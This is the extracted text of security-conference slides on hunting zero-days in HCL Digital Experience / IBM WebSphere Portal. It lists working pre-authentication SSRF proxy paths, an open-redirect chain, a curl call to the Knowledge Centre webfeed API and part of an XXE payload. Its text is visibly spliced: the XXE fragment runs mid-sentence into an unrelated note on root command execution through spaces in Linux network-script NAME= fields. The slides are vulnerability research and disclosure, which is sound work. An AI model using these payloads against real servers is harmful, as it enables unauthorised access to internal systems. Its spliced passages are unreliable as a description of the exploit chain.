Finding 0days in Enterprise Software
Shubham Shah
Hacking HCL Digital Experience also 
known as IBM Websphere Portal
What is HCL Digital Experience / IBM Websphere 
Portal
• Enterprise content management system. 
• Used by medium - large enterprises, and is a very flexible content delivery 
application. 
• Around 4.5k instances on the internet. 
• Often self-hosted on an IBM WebSphere server. 
• Widespread usage amongst fortune 500 and in companies running bug 
bounties.
IBM WebSphere
• Getting started by running the docker image: 
• docker run -p 127.0.0.1:30015:30015 ibmcom/websphere-portal:latest
Decompiling JARs
• find . -type f -name \*.jar -exec tar rf /tmp/outfile2.tar {} \; 
• find . -type f -name '*.jar' | xargs -n 1 -P 20 -I {} procyon-decompiler -o 
decompiled2 {}
Finding The Attack Surface
• grep -anril ‘' or grep -anril ‘ 
         GET 
         HEAD 
         POST 
         PUT 
         DELETE 
Super SSRF
• http://reverse.test:30015/wps/PA_WCM_Authoring_UI/proxy/http/
example.com
         x-lfn-url-callback 
         User-Agent 
         Accept* 
         Vary 
         Location 
         Content* 
         Authorization* 
         X-Method-Override 
         Set-Cookie 
         If-Modified-Since 
         If-None-Match 
         X-Server 
         X-Update-Nonce 
         X-Requested-With 
         com.ibm.lotus.openajax.virtualhost 
• GET/HEAD/POST/PUT/
DELETE requests via 
this SSRF. 
• Full response returned. 
• Some headers also 
proxied.
Super SSRF
Variant Hunting #2
• Through a lot of digging, I discovered a really interesting way to hit the proxy 
servlet. 
• /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://
www.redbooks.ibm.com/ 
• Using the same open redirect gadget, it was possible to achieve full read 
SSRF via this endpoint. 
• /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://
www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?
Logout&RedirectTo=http://example.com
Variant Hunting #2
Variant Hunting #3
• WebSphere/wp_profile/installedApps/dockerCell/
Quickr_Document_Picker.ear/qkr.docpicker.widgets.war/WEB-INF/web.xml
  AjaxProxy 
  /internal_proxy/* 
  picker_with_dojo 
  /public/picker-dojo-packaged.js 
  picker_without_dojo 
  /public/picker-packaged.js 
  portal_picker_without_dojo 
  /public/portal-picker-packaged.js 
  picker_css 
  /public/picker.css 
  ProxyServlet 
  /common_proxy/* 
Variant Hunting #3
• Requires open redirect chain to exploit: 
• http://127.0.0.1:30015/docpicker/common_proxy/http/
www.redbooks.ibm.com 
• Does not require any redirect chains, proxy works without redirect gadget: 
• http://127.0.0.1:30015/docpicker/internal_proxy/http/example.com 
• Full read SSRF (pre-auth) limited to GET requests.
Variant Hunting #3
Chaining the vulnerability through IBM KC
• IBM Knowledge Centre is shipped in the Admin Console of IBM Websphere 
on port 9043. 
• Through our SSRF we can access this port and hence this functionality. 
• The web.xml file had this snippet:
  JsonpCallbackFilter 
  com.ibm.kc.server.filter.JsonpCallbackFilter 
        JsonpCallbackFilter 
        /api/webfeed 
Chaining the vulnerability through IBM KC
• So naturally, we download the kc.war file: 
• › docker cp 7b10e70c3328:/opt/IBM/WebSphere/wp_profile/config/cells/
dockerCell/applications/isclite.ear/deployments/isclite/kc.war . 
• Load it up into our decompiler to checkout what the webfeed API looks like.
Bingo?!
So… we try it on a bug bounty target
• Fail
Has it been patched? Please don’t tell me it’s been 
patched.
• More recent Docker Image with only WebSphere app server (not portal): 
https://hub.docker.com/r/ibmcom/websphere-traditional/
curl https://127.0.0.1:9043/ibm/kc/api/webfeed -kv 
... 
 %xxe;]>http://example.compZ12_3PH42302J82K50ACTLIJJJ0006 script to /etc/sysconfig/
network-scripts or it can adjust an existing one, then your system is pwned. 
• Network scripts, ifcg-eth0 for example are used for network connections. The look 
exactly like .INI files. However, they are ~sourced~ on Linux by Network Manager 
(dispatcher.d). 
• In my case, the NAME= attributed in these network scripts is not handled correctly. If you 
have white/blank space in the name the system tries to execute the part after the white/
blank space. Which means; everything after the first blank space is executed as root.
References
• https://secur.codes/werdlists/webapp-paths/websphere-path-names.txt 
• https://websphere4u.files.wordpress.com/2012/05/websphere-portal-7-0-
e28093-changing-the-context-root.pdf 
• https://docs.google.com/document/d/
1mn85gaYwJZjgpOeIFTLfDUkmGzV4fLUWi8Zx_64ECVo/edit
Exploit Writeup
https://bit.ly/3989u9D 
Hacking Solarwinds Web Help 
Desk
What is Solarwinds Web Help Desk?
• Basically a central ticket management system for your enterprise. 
• Connects with Solarwinds Orion. 
• Used by medium-large enterprises, schools, government. 